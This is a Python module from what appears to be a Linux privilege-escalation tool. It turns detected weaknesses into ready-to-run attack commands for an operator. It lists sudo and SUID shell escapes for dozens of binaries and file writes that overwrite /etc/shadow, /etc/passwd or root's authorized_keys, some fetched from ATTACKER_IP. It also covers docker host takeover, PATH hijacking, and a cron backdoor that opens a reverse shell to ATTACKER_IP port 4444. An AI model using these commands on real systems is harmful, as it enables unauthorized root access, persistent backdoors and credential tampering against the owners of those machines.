"""
nullpeas/core/exploit_templates.py

This module translates abstract offensive primitives into concrete, 
copy-pasteable command strings for the operator.

It serves as the "Action Engine" for the Attack Chains.
"""

from typing import List, Dict, Tuple, Optional
from nullpeas.core.offensive_schema import Primitive

# ===========================================================================
# COMMAND TEMPLATES
# Format: (binary_name, capability_type): "template_string"
# ===========================================================================

TEMPLATES: Dict[Tuple[str, str], str] = {
    # === Sudo: Shell Escapes (capability="shell_spawn") ===
    # Editors & Pagers
    ("vim", "shell_spawn"): "sudo {binary} -c ':!/bin/sh'",
    ("vi", "shell_spawn"): "sudo {binary} -c ':!/bin/sh'",
    ("nvim", "shell_spawn"): "sudo {binary} -c ':!/bin/sh'",
    ("nano", "shell_spawn"): "sudo {binary}\n# Inside nano: Ctrl+R, Ctrl+X, then type: reset; sh 1>&0 2>&0",
    ("ed", "shell_spawn"): "sudo {binary}\n# Inside ed: !/bin/sh",
    ("less", "shell_spawn"): "sudo {binary} /etc/profile\n# Inside less: !/bin/sh",
    ("more", "shell_spawn"): "sudo {binary} /etc/profile\n# Inside more: !/bin/sh",
    ("man", "shell_spawn"): "sudo {binary} man\n# Inside man: !/bin/sh",
    ("journalctl", "shell_spawn"): "sudo {binary}\n# Inside pager: !/bin/sh",

    # Scripting Languages
    ("python", "shell_spawn"): "sudo {binary} -c 'import os; os.system(\"/bin/sh\")'",
    ("python2", "shell_spawn"): "sudo {binary} -c 'import os; os.system(\"/bin/sh\")'",
    ("python3", "shell_spawn"): "sudo {binary} -c 'import os; os.system(\"/bin/sh\")'",
    ("perl", "shell_spawn"): "sudo {binary} -e 'exec \"/bin/sh\";'",
    ("ruby", "shell_spawn"): "sudo {binary} -e 'exec \"/bin/sh\"'",
    ("lua", "shell_spawn"): "sudo {binary} -e 'os.execute(\"/bin/sh\")'",
    ("php", "shell_spawn"): "sudo {binary} -r \"system('/bin/sh');\"",
    ("tclsh", "shell_spawn"): "echo 'exec /bin/sh <@stdin >@stdout 2>@stderr' | sudo {binary}",
    ("expect", "shell_spawn"): "sudo {binary} -c 'spawn /bin/sh;interact'",
    ("node", "shell_spawn"): "sudo {binary} -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'",

    # System Tools
    ("find", "shell_spawn"): "sudo {binary} . -exec /bin/sh \\; -quit",
    ("awk", "shell_spawn"): "sudo {binary} 'BEGIN {system(\"/bin/sh\")}'",
    ("gawk", "shell_spawn"): "sudo {binary} 'BEGIN {system(\"/bin/sh\")}'",
    ("mawk", "shell_spawn"): "sudo {binary} 'BEGIN {system(\"/bin/sh\")}'",
    ("sed", "shell_spawn"): "sudo {binary} -n '1e exec /bin/sh' /etc/hosts",
    ("tar", "shell_spawn"): "sudo {binary} -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
    ("zip", "shell_spawn"): "sudo {binary} /tmp/foo.zip /etc/hosts -T -TT 'sh #'",
    ("git", "shell_spawn"): "sudo {binary} -p help config\n# Inside pager: !/bin/sh",
    ("apt", "shell_spawn"): "sudo {binary} changelog apt\n# Inside pager: !/bin/sh",
    ("apt-get", "shell_spawn"): "sudo {binary} changelog apt\n# Inside pager: !/bin/sh",
    ("dpkg", "shell_spawn"): "sudo {binary} -l\n# Inside pager: !/bin/sh",
    ("gdb", "shell_spawn"): "sudo {binary} -nx -ex '!sh' -ex quit",
    ("mysql", "shell_spawn"): "sudo {binary} -e '\\! /bin/sh'",
    ("psql", "shell_spawn"): "sudo {binary}\n# Inside psql: \\!",
    ("systemctl", "platform_control"): "sudo {binary} list-units\n# (Requires creating a malicious service unit file)",
    
    # Network Tools
    ("nmap", "shell_spawn"): "echo 'os.execute(\"/bin/sh\")' > /tmp/shell.nse && sudo {binary} --script=/tmp/shell.nse",
    ("tcpdump", "shell_spawn"): "echo 'os.execute(\"/bin/sh\")' > /tmp/shell.sh && chmod +x /tmp/shell.sh && sudo {binary} -z /tmp/shell.sh",
    ("socat", "shell_spawn"): "sudo {binary} stdin exec:/bin/sh",
    ("netcat", "shell_spawn"): "sudo {binary} -e /bin/sh 127.0.0.1 1337",
    ("nc", "shell_spawn"): "sudo {binary} -e /bin/sh 127.0.0.1 1337",
    ("ftp", "shell_spawn"): "sudo {binary}\n# Inside ftp: !/bin/sh",
    ("scp", "shell_spawn"): "TF=$(mktemp); echo 'sh 0<&2 1>&2' > $TF; chmod +x $TF; sudo {binary} -S $TF x y:",
    ("ssh", "shell_spawn"): "sudo {binary} -o ProxyCommand=';sh 0<&2 1>&2' x",

    # === Sudo: File Writes (capability="file_write") ===
    ("tee", "file_write"): "echo 'ssh-rsa AAAAB3...' | sudo {binary} -a /root/.ssh/authorized_keys",
    ("dd", "file_write"): "echo 'evil' | sudo {binary} of=/etc/ld.so.preload",
    ("cp", "file_write"): "sudo {binary} /tmp/evil_passwd /etc/passwd",
    ("mv", "file_write"): "sudo {binary} /tmp/evil_shadow /etc/shadow",
    ("wget", "file_write"): "sudo {binary} -O /etc/shadow http://ATTACKER_IP/evil_shadow",
    ("curl", "file_write"): "sudo {binary} -o /etc/shadow http://ATTACKER_IP/evil_shadow",

    # === SUID: Known Shell Spawners (capability="suid_shell") ===
    ("bash", "suid_shell"): "{binary} -p",
    ("sh", "suid_shell"): "{binary} -p",
    ("env", "suid_shell"): "{binary} /bin/sh -p",
    ("dash", "suid_shell"): "{binary} -p",
    ("zsh", "suid_shell"): "{binary}",
    ("python", "suid_shell"): "{binary} -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
    ("python3", "suid_shell"): "{binary} -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
    ("perl", "suid_shell"): "{binary} -e 'exec \"/bin/sh\";'",
    ("make", "suid_shell"): "COMMAND='/bin/sh -p' {binary} -s --eval=$'x:\\n\\t-'" + "$COMMAND",
    ("cpulimit", "suid_shell"): "{binary} -l 100 -f /bin/sh",
    ("taskset", "suid_shell"): "{binary} 1 /bin/sh -p",
    ("flock", "suid_shell"): "{binary} -u / /bin/sh -p",
    
    # === Docker ===
    ("docker", "host_takeover"): "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
    
    # === Cron ===
    ("cron", "writable_script"): "echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> {target}\n# Wait for cron...",
    ("cron", "user_persistence"): "(crontab -l; echo '* * * * * /bin/bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"') | crontab -",

    # === PATH Hijack ===
    ("path", "hijack"): "echo -e '#!/bin/bash\\n/bin/bash -p' > {target}/<TARGET_BINARY>\nchmod +x {target}/<TARGET_BINARY>",
}


def _get_template(binary: str, capability: str) -> Optional[str]:
    # 1. Exact match
    if (binary, capability) in TEMPLATES:
        return TEMPLATES[(binary, capability)]
    
    # 2. Sudo fallback (many editors behave similarly)
    if capability == "shell_spawn" and binary in ["ed", "ex", "vi", "view", "emacs"]:
        return "sudo {binary}\n# Inside editor: !/bin/sh"
    
    # 3. Pager fallback
    if capability == "shell_spawn" and binary in ["more", "less", "pg"]:
        return "sudo {binary} /etc/profile\n# Inside pager: !/bin/sh"

    return None


def generate_exploit_for_chain(p: Primitive) -> List[str]:
    """
    Generates a list of suggested command strings for a given primitive.
    """
    cmds = []
    
    # Context extraction
    binary = p.context.get("binary")
    path = p.context.get("binary_path") or binary
    
    # === 1. ROOT SHELL PRIMITIVES (Sudo / SUID) ===
    if p.type in {"root_shell_primitive", "suid_primitive"}:
        
        # A. Sudo (ALL) ALL
        if p.surface == "sudo" and p.context.get("is_all_rule") and p.context.get("nopasswd"):
            cmds.append("sudo su -")
            return cmds
            
        # B. Binary Specific
        if binary:
            # 1. Check for specific SUID shell escape
            if p.surface == "suid":
                tpl = _get_template(binary, "suid_shell")
                if tpl:
                    cmds.append(tpl.format(binary=path))
                    return cmds

                # If no specific SUID template, but it's a known shell spawner (like vim),
                # we can reuse the "shell_spawn" template but STRIP "sudo " from the start.
                tpl_sudo = _get_template(binary, "shell_spawn")
                if tpl_sudo:
                    # e.g. "sudo vim -c ..." -> "vim -c ..."
                    clean_cmd = tpl_sudo.replace("sudo {binary}", "{binary}")
                    cmds.append(clean_cmd.format(binary=path))
                    return cmds
                
                # Generic SUID fallback (unknown binary)
                cmds.append(f"{path} # (Try known args like -p, --shell, or reverse engineering)")

            # 2. Check for Sudo shell escape
            elif p.surface == "sudo":
                tpl = _get_template(binary, "shell_spawn")
                if tpl:
                    cmds.append(tpl.format(binary=path))

    # === 2. DOCKER HOST TAKEOVER ===
    elif p.type == "docker_host_takeover":
        if p.conditions.get("requires_docker_cli"):
            cmds.append(TEMPLATES[("docker", "host_takeover")])
        else:
            socket = p.affected_resource or "/var/run/docker.sock"
            cmds.append(f"curl -XPOST --unix-socket {socket} -d '{{...}}' http://localhost/containers/create")

    # === 3. ARBITRARY FILE WRITE ===
    elif p.type == "arbitrary_file_write_primitive":
        if binary:
            tpl = _get_template(binary, "file_write")
            if tpl:
                cmds.append(tpl.format(binary=path))

    # === 4. CRON EXECUTION ===
    elif p.type == "cron_exec_primitive":
        target = p.context.get("target_file")
        if target:
            tpl = TEMPLATES[("cron", "writable_script")]
            cmds.append(tpl.format(target=target))
    
    elif p.type == "cron_user_persistence_surface":
        # Backdoor current user's crontab
        cmds.append(TEMPLATES[("cron", "user_persistence")])

    # === 5. PATH HIJACKING ===
    elif p.type == "path_hijack_surface":
        target_dir = p.affected_resource
        if target_dir:
            tpl = TEMPLATES[("path", "hijack")]
            cmds.append(tpl.format(target=target_dir))
            cmds.append("# Replace <TARGET_BINARY> with a binary name typically run by root (e.g. 'ls', 'cat', 'python')")

    return cmds
